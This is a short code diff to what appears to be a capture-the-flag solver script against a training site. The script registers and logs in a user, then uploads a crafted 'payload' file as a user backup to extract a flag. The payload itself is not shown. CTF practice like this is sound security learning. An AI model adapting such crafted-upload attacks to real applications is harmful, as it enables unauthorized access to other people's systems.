@@ -9,7 +9,7 @@ url = "http://meta.training.jinblack.it"
 def find_flag(data):
 	search = re.search("flag{[a-zA-Z1-9_!]+}", data)
 	if search:
-		print(search.group())
+		return search.group()
 	  
 
 def gen_ran_string(size=15):
@@ -33,6 +33,7 @@ s = requests.Session()
 
 register(s, u, p)
 login(s, u, p)
-find_flag(upload_file(s, 'user_bak', ('payload', open('payload', 'rb'))))
+# we upload a crafted user and print the flag
+print(find_flag(upload_file(s, 'user_bak', ('payload', open('payload', 'rb')))))
 
 
